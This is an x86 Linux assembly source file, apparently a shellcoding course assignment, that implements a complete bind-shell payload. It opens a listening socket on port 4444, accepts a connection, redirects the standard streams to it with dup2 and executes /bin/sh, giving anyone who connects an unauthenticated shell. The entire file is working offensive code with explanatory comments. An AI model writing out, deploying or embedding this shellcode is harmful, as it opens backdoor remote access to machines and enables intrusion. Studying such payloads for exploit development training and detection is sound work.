; Filename: bind_shell.nasm
; Author:  SLAE-1476
; twitter: @bolonobolo
; email: bolo@autistici.org / iambolo@protonmail.com

global _start

section .text
_start:
	
	; --------------------------------------------------
    ; SOCKET
    ; xoring the registers
    xor eax, eax
    xor ebx, ebx
    xor ecx, ecx
    xor edx, edx
    mov cl, 0x01
    mov bl, 0x02
    mov ax, 0x167
    int 0x80

    ; move the return value of socket from EAX to EDI
    mov edi, eax

    ; --------------------------------------------------
    ; BIND
    ; move the lenght (16 bytes) of IP in EDX
    mov dl, 0x16
    

    ; push sockaddr structure in the stack
    xor ecx, ecx
    push ecx                ; unused char (0)
    push ecx                ; ip address 0.0.0.0 
    push word 0x5c11        ; port 4444
    push word 0x02          ; AF_INET family

    ; move the stack pointer to ECX
    mov ecx, esp
    
    ; move the socket pointer to EBX
    mov ebx, edi

    ; load the bind syscall value in EAX
    xor eax, eax
    mov ax, 0x169

    ; execute
    int 0x80

    ; --------------------------------------------------
    ; LISTEN
    mov ebx, edi
    mov ax, 0x16b
    int 0x80

    ; --------------------------------------------------
    ; ACCEPT
    xor eax, eax
    xor ebx, ebx
    xor ecx, ecx
    xor esi, esi
    mov ebx, edi
    mov ax, 0x16c
    int 0x80

    ; move the return value of accept from EAX to EDI
    xor edi, edi
    mov edi, eax

    ; --------------------------------------------------
    ; DUP2
    xor ebx, ebx
    xor ecx, ecx
    mov cl, 0x3

dup2:
    xor eax, eax
    mov al, 0x3f
    mov ebx, edi
    dec cl
    int 0x80
    jnz dup2

    ; --------------------------------------------------
    ; EXECVE
	; put NULL bytes in the stack
    xor eax, eax
    push eax

    ; reverse "/bin//sh"
    ; hs// : 68732f2f
    ; nib/ : 6e69622f
    ; String length : 8
    ; Hex length : 16
    ; 68732f2f6e69622f

    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp

    ; push NULL in the EDX position
    push eax
    mov edx, esp

    ; push the /bin//sh address in the stack and then move it in ECX
    push ebx
    mov ecx, esp

    ; call the execve syscall
    mov al, 0x0b
    int 0x80
